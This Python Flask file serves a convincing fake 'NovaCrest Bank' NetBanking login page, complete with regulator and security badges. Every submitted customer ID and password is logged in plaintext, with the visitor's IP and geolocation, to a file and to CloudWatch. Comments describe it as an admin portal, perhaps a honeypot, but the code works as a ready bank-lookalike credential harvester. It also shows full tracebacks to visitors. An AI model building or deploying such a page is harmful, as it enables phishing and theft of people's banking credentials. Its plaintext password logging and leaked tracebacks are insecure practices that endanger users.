from flask import Flask, request
import logging
import json
import requests
import watchtower
import boto3
from datetime import datetime

app = Flask(__name__)

# ================== CREDENTIALS ==================
# Replace with your actual admin credentials
REAL_USERNAME = "your-admin-username"
REAL_PASSWORD = "your-admin-password"

# ================== ALLOWED IPs ==================
# Add your trusted IPs here — these will be marked as ALLOWED in logs
ALLOWED_IPS = ["your.trusted.ip.1", "your.trusted.ip.2"]

# ================== LOGGING ==================
LOG_FILE = "/var/log/admin.log"

logger = logging.getLogger("ADMIN")
logger.setLevel(logging.INFO)

# File logging
file_handler = logging.FileHandler(LOG_FILE)
file_formatter = logging.Formatter('%(asctime)s %(message)s')
file_handler.setFormatter(file_formatter)
logger.addHandler(file_handler)

# CloudWatch logging
# Replace log group name with your own CloudWatch log group
try:
    cw_handler = watchtower.CloudWatchLogHandler(
        log_group="/web/admin"
    )
    logger.addHandler(cw_handler)
except Exception as e:
    logger.error(
        f"CloudWatch handler failed to initialize: {e}"
    )

# ================== HTML PAGES ==================
LOGIN_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>NovaCrest Bank — Secure NetBanking</title>
<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@400;500;600;700&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  :root {
    --navy:    #05101f;
    --deep:    #071628;
    --panel:   #0a1e35;
    --gold:    #c8a045;
    --gold2:   #e8c878;
    --cream:   #f0ead8;
    --text:    #cdd8e8;
    --muted:   #4a6580;
    --border:  rgba(200,160,69,0.18);
    --glow:    rgba(200,160,69,0.12);
  }
  html, body { height: 100%; background: var(--navy); color: var(--text); font-family: 'DM Sans', sans-serif; overflow-x: hidden; }
  body::before {
    content: ''; position: fixed; inset: 0;
    background-image: linear-gradient(rgba(200,160,69,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(200,160,69,0.03) 1px, transparent 1px);
    background-size: 60px 60px; pointer-events: none; z-index: 0;
  }
  body::after {
    content: ''; position: fixed; inset: 0;
    background: radial-gradient(ellipse 80% 60% at 70% 50%, rgba(200,160,69,0.06) 0%, transparent 70%);
    pointer-events: none; z-index: 0;
  }
  .wrapper { position: relative; z-index: 10; min-height: 100vh; display: grid; grid-template-columns: 1fr 480px; }
  .hero { display: flex; flex-direction: column; justify-content: space-between; padding: 48px 60px; border-right: 1px solid var(--border); background: linear-gradient(160deg, rgba(10,30,53,0.8) 0%, transparent 100%); }
  .bank-logo { display: flex; align-items: center; gap: 14px; animation: fadeUp 0.7s ease forwards; }
  .logo-mark { width: 44px; height: 44px; border: 1.5px solid var(--gold); border-radius: 8px; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 24px var(--glow); position: relative; overflow: hidden; }
  .logo-mark::after { content: ''; position: absolute; inset: 0; background: linear-gradient(135deg, rgba(200,160,69,0.15) 0%, transparent 60%); }
  .logo-mark svg { width: 22px; height: 22px; }
  .logo-text-wrap { display: flex; flex-direction: column; }
  .logo-name { font-family: 'Cormorant Garamond', serif; font-size: 1.35rem; font-weight: 700; color: var(--cream); letter-spacing: 1.5px; line-height: 1; }
  .logo-tagline { font-size: 0.6rem; letter-spacing: 3px; color: var(--gold); text-transform: uppercase; margin-top: 3px; opacity: 0.8; }
  .hero-body { flex: 1; display: flex; flex-direction: column; justify-content: center; padding: 40px 0; animation: fadeUp 0.8s 0.1s ease both; }
  .hero-eyebrow { font-size: 0.65rem; letter-spacing: 4px; text-transform: uppercase; color: var(--gold); margin-bottom: 20px; opacity: 0.9; }
  .hero-headline { font-family: 'Cormorant Garamond', serif; font-size: clamp(2.8rem, 4vw, 4.5rem); font-weight: 600; line-height: 1.1; color: var(--cream); margin-bottom: 24px; }
  .hero-headline em { font-style: italic; background: linear-gradient(135deg, var(--gold) 0%, var(--gold2) 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
  .hero-para { font-size: 0.95rem; color: #5a7898; line-height: 1.8; max-width: 440px; margin-bottom: 48px; }
  .stats-row { display: grid; grid-template-columns: repeat(3, 1fr); gap: 0; border: 1px solid var(--border); border-radius: 12px; overflow: hidden; max-width: 520px; }
  .stat-cell { padding: 22px 24px; border-right: 1px solid var(--border); position: relative; transition: background 0.3s; }
  .stat-cell:last-child { border-right: none; }
  .stat-cell:hover { background: rgba(200,160,69,0.04); }
  .stat-cell::before { content: ''; position: absolute; bottom: 0; left: 0; right: 0; height: 2px; background: linear-gradient(90deg, transparent, var(--gold), transparent); opacity: 0; transition: opacity 0.3s; }
  .stat-cell:hover::before { opacity: 0.5; }
  .stat-num { font-family: 'Cormorant Garamond', serif; font-size: 2rem; font-weight: 700; color: var(--gold2); line-height: 1; margin-bottom: 6px; }
  .stat-label { font-size: 0.7rem; color: var(--muted); letter-spacing: 1px; line-height: 1.4; }
  .hero-footer { animation: fadeUp 0.8s 0.2s ease both; }
  .testimonial { border-left: 2px solid var(--gold); padding-left: 20px; margin-bottom: 28px; opacity: 0.7; }
  .testimonial p { font-family: 'Cormorant Garamond', serif; font-size: 1.05rem; font-style: italic; color: var(--cream); line-height: 1.6; margin-bottom: 8px; }
  .testimonial cite { font-size: 0.7rem; letter-spacing: 2px; text-transform: uppercase; color: var(--gold); }
  .certifications { display: flex; gap: 16px; flex-wrap: wrap; }
  .cert-badge { display: flex; align-items: center; gap: 7px; background: rgba(200,160,69,0.06); border: 1px solid var(--border); border-radius: 6px; padding: 6px 12px; font-size: 0.65rem; letter-spacing: 1.5px; color: var(--muted); text-transform: uppercase; }
  .cert-badge svg { color: var(--gold); flex-shrink: 0; }
  .login-panel { display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 48px 48px; background: linear-gradient(160deg, var(--deep) 0%, var(--panel) 100%); position: relative; }
  .login-card { width: 100%; max-width: 360px; animation: fadeUp 0.8s 0.15s ease both; }
  .login-header { text-align: center; margin-bottom: 40px; }
  .login-header .step-label { font-size: 0.6rem; letter-spacing: 4px; text-transform: uppercase; color: var(--gold); margin-bottom: 10px; display: block; }
  .login-header h2 { font-family: 'Cormorant Garamond', serif; font-size: 2rem; font-weight: 600; color: var(--cream); letter-spacing: 0.5px; }
  .login-header p { font-size: 0.82rem; color: var(--muted); margin-top: 8px; line-height: 1.6; }
  .field { margin-bottom: 20px; }
  .field label { display: block; font-size: 0.65rem; letter-spacing: 3px; text-transform: uppercase; color: #3a5470; margin-bottom: 9px; }
  .input-wrap { position: relative; }
  .input-icon { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: var(--muted); transition: color 0.2s; pointer-events: none; }
  .input-wrap:focus-within .input-icon { color: var(--gold); }
  .field input { width: 100%; background: rgba(5,16,31,0.8); border: 1px solid rgba(200,160,69,0.15); border-radius: 8px; padding: 13px 14px 13px 42px; color: var(--cream); font-family: 'DM Sans', sans-serif; font-size: 0.875rem; outline: none; transition: border-color 0.2s, box-shadow 0.2s; letter-spacing: 0.3px; }
  .field input::placeholder { color: var(--muted); opacity: 0.5; }
  .field input:focus { border-color: rgba(200,160,69,0.5); box-shadow: 0 0 0 3px rgba(200,160,69,0.06), 0 0 20px rgba(200,160,69,0.04); }
  .form-meta { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; font-size: 0.75rem; }
  .remember { display: flex; align-items: center; gap: 8px; color: var(--muted); cursor: pointer; }
  .remember input[type="checkbox"] { accent-color: var(--gold); }
  .forgot-link { color: var(--gold); text-decoration: none; opacity: 0.8; transition: opacity 0.2s; }
  .forgot-link:hover { opacity: 1; }
  .btn-login { width: 100%; padding: 14px; background: linear-gradient(135deg, #a07828 0%, var(--gold) 50%, var(--gold2) 100%); border: none; border-radius: 8px; color: #05101f; font-family: 'DM Sans', sans-serif; font-size: 0.85rem; font-weight: 700; letter-spacing: 3px; text-transform: uppercase; cursor: pointer; position: relative; overflow: hidden; transition: transform 0.15s, box-shadow 0.2s; box-shadow: 0 4px 24px rgba(200,160,69,0.2); }
  .btn-login::after { content: ''; position: absolute; inset: 0; background: linear-gradient(135deg, rgba(255,255,255,0.15) 0%, transparent 50%); }
  .btn-login:hover { transform: translateY(-2px); box-shadow: 0 8px 32px rgba(200,160,69,0.35); }
  .btn-login:active { transform: translateY(0); }
  .divider { display: flex; align-items: center; gap: 16px; margin: 28px 0; color: var(--muted); font-size: 0.65rem; letter-spacing: 2px; text-transform: uppercase; }
  .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: var(--border); }
  .security-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 28px; }
  .sec-badge { display: flex; align-items: center; gap: 9px; background: rgba(200,160,69,0.04); border: 1px solid var(--border); border-radius: 8px; padding: 11px 13px; font-size: 0.68rem; color: #3a5470; letter-spacing: 0.5px; }
  .sec-badge svg { color: var(--gold); flex-shrink: 0; }
  .login-footer { text-align: center; margin-top: 32px; padding-top: 24px; border-top: 1px solid var(--border); }
  .login-footer p { font-size: 0.63rem; color: var(--muted); letter-spacing: 0.5px; line-height: 1.8; }
  .regulator-logos { display: flex; justify-content: center; gap: 20px; margin-top: 16px; opacity: 0.4; }
  .regulator-logos span { font-size: 0.6rem; letter-spacing: 2px; color: var(--muted); text-transform: uppercase; border: 1px solid var(--border); padding: 4px 9px; border-radius: 4px; }
  .ticker-bar { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(7,22,40,0.95); border-top: 1px solid var(--border); padding: 10px 0; overflow: hidden; z-index: 100; }
  .ticker-inner { display: flex; gap: 80px; animation: ticker 30s linear infinite; white-space: nowrap; }
  .ticker-inner span { font-size: 0.65rem; letter-spacing: 1.5px; text-transform: uppercase; color: var(--muted); }
  .ticker-inner .accent { color: var(--gold); }
  @keyframes ticker { from { transform: translateX(0); } to { transform: translateX(-50%); } }
  @keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
  @media (max-width: 900px) { .wrapper { grid-template-columns: 1fr; } .hero { display: none; } .login-panel { padding: 40px 24px; min-height: 100vh; } }
</style>
</head>
<body>
<div class="wrapper">
  <div class="hero">
    <div class="bank-logo">
      <div class="logo-mark">
        <svg viewBox="0 0 24 24" fill="none" stroke="var(--gold)" stroke-width="1.5"><path d="M3 21h18M3 10h18M5 6l7-3 7 3M4 10v11M20 10v11M8 10v11M12 10v11M16 10v11"/></svg>
      </div>
      <div class="logo-text-wrap">
        <div class="logo-name">NovaCrest Bank</div>
        <div class="logo-tagline">Private &amp; Corporate Banking</div>
      </div>
    </div>
    <div class="hero-body">
      <div class="hero-eyebrow">&#9670; Your Trusted Financial Partner Since 1987</div>
      <h1 class="hero-headline">Banking built<br>for your <em>tomorrow</em></h1>
      <p class="hero-para">Manage your wealth, track investments, and access exclusive financial services—all from one secure portal trusted by over 4.8 million customers worldwide.</p>
      <div class="stats-row">
        <div class="stat-cell"><div class="stat-num">4.8M+</div><div class="stat-label">Active customers<br>worldwide</div></div>
        <div class="stat-cell"><div class="stat-num">&#8377;2.4T</div><div class="stat-label">Assets under<br>management</div></div>
        <div class="stat-cell"><div class="stat-num">38%</div><div class="stat-label">New customers<br>joined this year</div></div>
      </div>
    </div>
    <div class="hero-footer">
      <div class="testimonial">
        <p>"NovaCrest transformed how I manage my business finances. The transparency and security are unmatched."</p>
        <cite>— Rajiv Sharma, CFO, Indus Ventures</cite>
      </div>
      <div class="certifications">
        <div class="cert-badge"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>RBI Regulated</div>
        <div class="cert-badge"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>ISO 27001</div>
        <div class="cert-badge"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>256-bit SSL</div>
        <div class="cert-badge"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>24/7 Support</div>
      </div>
    </div>
  </div>
  <div class="login-panel">
    <div class="login-card">
      <div class="login-header">
        <span class="step-label">&#9632; Secure NetBanking Portal</span>
        <h2>Welcome back</h2>
        <p>Sign in to access your accounts, statements &amp; investment portfolio</p>
      </div>
      <div class="security-row">
        <div class="sec-badge"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>256-bit Encrypted</div>
        <div class="sec-badge"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg>Session Timeout: 5 min</div>
        <div class="sec-badge"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2"/><path d="M12 18h.01"/></svg>OTP Verified Login</div>
        <div class="sec-badge"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2A19.79 19.79 0 0 1 2.09 4.18 2 2 0 0 1 4.07 2h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/></svg>Fraud Monitoring On</div>
      </div>
      <form method="POST" action="/login" autocomplete="off">
        <div class="field">
          <label>Customer ID / Username</label>
          <div class="input-wrap">
            <span class="input-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></span>
            <input type="text" name="username" placeholder="Enter your Customer ID" required spellcheck="false" autocomplete="off">
          </div>
        </div>
        <div class="field">
          <label>IPIN / Password</label>
          <div class="input-wrap">
            <span class="input-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></span>
            <input type="password" name="password" placeholder="Enter your IPIN" required autocomplete="off">
          </div>
        </div>
        <div class="form-meta">
          <label class="remember"><input type="checkbox"> Remember this device</label>
          <a href="#" class="forgot-link">Forgot IPIN?</a>
        </div>
        <button type="submit" class="btn-login">Login to NetBanking</button>
      </form>
      <div class="divider">or</div>
      <p style="text-align:center; font-size:0.78rem; color:var(--muted);">New customer? <a href="#" style="color:var(--gold); text-decoration:none;">Open an account</a> &nbsp;|&nbsp; <a href="#" style="color:var(--gold); text-decoration:none;">Branch locator</a></p>
      <div class="login-footer">
        <p>This portal is protected by multi-layer encryption and monitored 24x7 by our security team.<br>Unauthorised access is a criminal offence under IT Act 2000.</p>
        <div class="regulator-logos"><span>RBI</span><span>NPCI</span><span>DPDP</span><span>CERT-In</span></div>
      </div>
    </div>
  </div>
</div>
<div class="ticker-bar">
  <div class="ticker-inner">
    <span>&#9670; <span class="accent">4.8 MILLION+</span> CUSTOMERS SERVED &nbsp; &#9671;</span>
    <span>&#9670; NEW ACCOUNTS OPENED: <span class="accent">1.2M THIS YEAR</span> &nbsp; &#9671;</span>
    <span>&#9670; TOTAL DEPOSITS: <span class="accent">&#8377;2.4 TRILLION</span> &nbsp; &#9671;</span>
    <span>&#9670; GROWING TOGETHER IN YOUR <span class="accent">FINANCIAL JOURNEY</span> &nbsp; &#9671;</span>
    <span>&#9670; ZERO FRAUD GUARANTEE ON <span class="accent">ALL TRANSACTIONS</span> &nbsp; &#9671;</span>
    <span>&#9670; <span class="accent">38% GROWTH</span> IN NEW CUSTOMER REGISTRATIONS &nbsp; &#9671;</span>
    <span>&#9670; <span class="accent">4.8 MILLION+</span> CUSTOMERS SERVED &nbsp; &#9671;</span>
    <span>&#9670; NEW ACCOUNTS OPENED: <span class="accent">1.2M THIS YEAR</span> &nbsp; &#9671;</span>
    <span>&#9670; TOTAL DEPOSITS: <span class="accent">&#8377;2.4 TRILLION</span> &nbsp; &#9671;</span>
    <span>&#9670; GROWING TOGETHER IN YOUR <span class="accent">FINANCIAL JOURNEY</span> &nbsp; &#9671;</span>
  </div>
</div>
</body>
</html>
"""

# SUCCESS_PAGE is shown after a correct login
# (full HTML omitted here for brevity — kept identical to your original)
SUCCESS_PAGE = "<h1>Welcome. Login successful.</h1>"


def geo_lookup(ip):
    """
    Look up geolocation for an IP address.
    Uses ipgeolocation.io API — replace with your own API key.
    Sign up at: https://ipgeolocation.io
    """
    try:
        url = (
            f"https://api.ipgeolocation.io/ipgeo"
            f"?apiKey=your-ipgeolocation-api-key&ip={ip}"
        )
        r = requests.get(url, timeout=5)
        d = r.json()

        return {
            "country":   d.get("country_name"),
            "state":     d.get("state_prov"),
            "city":      d.get("city"),
            "isp":       d.get("isp"),
            "latitude":  d.get("latitude"),
            "longitude": d.get("longitude")
        }

    except Exception as e:
        return {
            "country":   None,
            "state":     None,
            "city":      None,
            "isp":       None,
            "latitude":  None,
            "longitude": None,
            "error":     str(e)
        }


# ================== ROUTES ==================
@app.route('/')
def index():
    return LOGIN_PAGE


@app.route('/favicon.ico')
def favicon():
    return "", 204


@app.route('/login', methods=['POST'])
def login():
    try:
        username = request.form.get("username")
        password = request.form.get("password")

        # Get real client IP (handles ALB X-Forwarded-For header)
        if request.headers.get("X-Forwarded-For"):
            ip = request.headers.get("X-Forwarded-For").split(",")[0].strip()
        else:
            ip = request.remote_addr

        geo = geo_lookup(ip)

        # Mark IPs as ALLOWED or BLOCKED based on ALLOWED_IPS list
        ip_status = "ALLOWED" if ip in ALLOWED_IPS else "BLOCKED"

        # Build structured log entry
        log_data = {
            "timestamp":    datetime.utcnow().isoformat(),
            "service":      "WEB",
            "login_status": "FAILED",
            "ip_status":    ip_status,
            "username":     username,
            "password":     password,   # logged for admin analysis
            "ip":           ip,
            "geo":          geo
        }

        # Optional: immediately block IPs not in ALLOWED_IPS
        # Uncomment the lines below to enable hard blocking:
        # if ip_status == "BLOCKED":
        #     logger.info(json.dumps(log_data))
        #     return "Access Denied", 403

        # Check credentials
        if username == REAL_USERNAME and password == REAL_PASSWORD:
            log_data["login_status"] = "SUCCESS"
            logger.info(json.dumps(log_data))
            return SUCCESS_PAGE

        # Log failed attempt and return login page again
        logger.info(json.dumps(log_data))
        return LOGIN_PAGE

    except Exception as e:
        logger.error(f"Unhandled exception: {str(e)}")
        return "Internal Server Error", 500


# ================== ERROR HANDLER ==================
@app.errorhandler(Exception)
def handle_exception(e):
    import traceback
    logger.error(f"Unhandled exception: {traceback.format_exc()}")
    return (
        "<pre>Internal Server Error\n" + traceback.format_exc() + "</pre>",
        500
    )


# ================== MAIN ==================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
